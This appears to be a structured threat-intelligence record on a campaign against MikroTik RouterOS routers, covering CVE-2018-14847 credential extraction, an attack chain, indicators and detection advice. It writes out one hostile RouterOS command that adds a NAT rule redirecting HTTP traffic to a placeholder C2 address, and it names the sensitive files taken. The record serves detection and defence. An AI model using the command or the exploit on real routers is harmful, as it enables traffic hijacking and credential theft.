package_info.package_versions: All vulnerable MikroTik RouterOS versions (especially those affected by CVE-2018-14847)
package_info.why_malicious: This campaign targets MikroTik routers by exploiting weak or default credentials and the CVE-2018-14847 vulnerability to gain unauthorized access. After compromise, it deploys malicious SSH commands to alter router configurations, redirecting network traffic to attacker-controlled infrastructure, establishing persistent command-and-control (C2) channels, and evading detection. The attack enables large-scale traffic manipulation and can be used for further malware distribution or data interception.

execution_context.trigger: post-compromise (after gaining access via credentials or exploit)
execution_context.file_location: SSH shell session on MikroTik RouterOS

malicious_snippets.code_snippet: ip firewall nat add chain=dstnat protocol=tcp dst-port=80 action=dst-nat to-addresses=<C2_IP> to-ports=<C2_PORT>
malicious_snippets.code_behavior: After successful compromise, the attacker issues a command via SSH shell to add a NAT rule that redirects all incoming TCP traffic on port 80 to a remote C2 server, enabling persistent C2 communication and redirecting HTTP traffic to attacker infrastructure.

malice_analysis.why_suspicious: Adding NAT rules that redirect HTTP traffic to external, attacker-controlled IP addresses is a strong indicator of malicious post-compromise activity, as it enables covert C2 communication and traffic hijacking.
malice_analysis.violated_expectations: Legitimate router administration does not involve redirecting all HTTP traffic to unknown or untrusted external servers without explicit user configuration and consent.
malice_analysis.similar_legitimate_use: Network administrators may configure NAT rules for port forwarding or load balancing, but not to redirect all HTTP traffic to untrusted or non-corporate external IPs, especially following unauthorized access.
key_indicators: NAT rules with to-addresses set to external, non-corporate IPs
Commands issued via SSH or Winbox after unauthorized access
Addition of dstnat rules targeting common service ports (e.g., 80, 443) with redirection to unknown destinations

execution_context.file_location: RouterOS configuration (via Winbox, SSH, or API)

malicious_snippets.code_snippet: Exploit CVE-2018-14847 to extract router credentials and configuration files
malicious_snippets.code_behavior: At initial access, the attacker exploits CVE-2018-14847 to read sensitive configuration files and extract credentials from the router, enabling privilege escalation and persistent access.

malice_analysis.why_suspicious: Exploiting a known vulnerability to access and extract sensitive configuration files and credentials is a clear sign of malicious intent and unauthorized activity.
malice_analysis.violated_expectations: Legitimate users do not exploit vulnerabilities to access configuration files or credentials; such actions violate standard security practices.
key_indicators: Use of CVE-2018-14847 exploit patterns in logs or network traffic
Unauthorized access to sensitive configuration files (e.g., user.dat, system.cfg)
Extraction of credentials or configuration data outside of normal administrative procedures

attack_chain.action: Attacker gains access to MikroTik router via default credentials, brute force, or by exploiting CVE-2018-14847 to extract credentials and configuration files.
attack_chain.leads_to: Ability to execute arbitrary commands on the router with administrative privileges

attack_chain.action: Attacker issues SSH shell commands to add NAT rules that redirect HTTP traffic to attacker-controlled C2 infrastructure.
attack_chain.leads_to: Establishes persistent C2 channel, enables traffic redirection, and maintains attacker control over the compromised router

behavioral_signatures: Addition of NAT rules redirecting HTTP or HTTPS traffic to external, non-corporate IP addresses
Unusual SSH or Winbox access from IPs not associated with legitimate administrators
Configuration file access or download attempts matching CVE-2018-14847 exploit patterns
Sudden changes to router configuration without corresponding authorized change tickets
file_indicators: Unexpected changes in /ip firewall nat configuration, especially new dstnat rules targeting ports 80 or 443
Access logs showing use of Winbox or SSH from non-administrative or foreign IP addresses
Unscheduled access or export of sensitive files such as user.dat or system.cfg
network_indicators: Outbound connections from the router to known Trickbot C2 IP addresses or domains
Redirection of HTTP/HTTPS traffic to non-standard or previously unseen external addresses
Unusual spikes in traffic volume to external IPs following configuration changes
detection_knowledge.how_to_detect: Continuously monitor MikroTik router configurations for unauthorized or suspicious NAT rules, especially those redirecting HTTP/HTTPS traffic to external or untrusted IPs. Audit access logs for signs of brute force attempts, use of default credentials, or exploitation of CVE-2018-14847 (e.g., unauthorized configuration file access). Monitor for outbound connections to known Trickbot C2 infrastructure and for unexpected changes in router configuration files. Correlate configuration changes with access events to identify unauthorized administrative actions.
